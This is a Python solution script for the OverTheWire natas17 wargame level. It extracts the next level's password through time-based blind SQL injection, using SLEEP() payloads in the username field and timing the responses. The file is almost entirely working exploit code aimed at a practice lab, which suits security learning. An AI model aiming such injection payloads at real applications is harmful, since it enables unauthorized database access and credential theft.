"""
Help script to resolve natas challenge #17
"""
import requests
import json

level = 'natas17'
url = 'http://{}.natas.labs.overthewire.org/index.php'.format(level)
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
seen = ''
password = ''

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
In this level we perform again blind SQLI but there is no output we could rely on.
We may try to sleep a certain amount of time to distinguish between requests.
"""

""" Find used chars. """
for symbol in charset:
    # Request
    response = requests.post(url,
                             data={'username': 'natas18" AND password LIKE BINARY \'%{}%\' and SLEEP(2) #'.format(symbol)},
                             auth=auth)

    if response.elapsed.seconds >= 2:
        seen += symbol
        print(seen)

print('{}: {}'.format(len(seen), seen))

# # We know the pass is 32 character long. The LEFT() operator takes the amount of characters, therefore start with 1.
for iteration in range(0, 32):
    # Guess if the password string starts with the seen string.
    for symbol in seen:
        # Request
        response = requests.post(url,
                                 data={'username': 'natas18" AND LEFT(password,{}) LIKE BINARY \'%{}%\' and SLEEP(2) #'.format(iteration + 1, password + symbol)},
                                 auth=auth)
        if response.elapsed.seconds >= 2:
            password += symbol
            print(password)

print("The password should be: {} len: {}".format(password, len(password)))
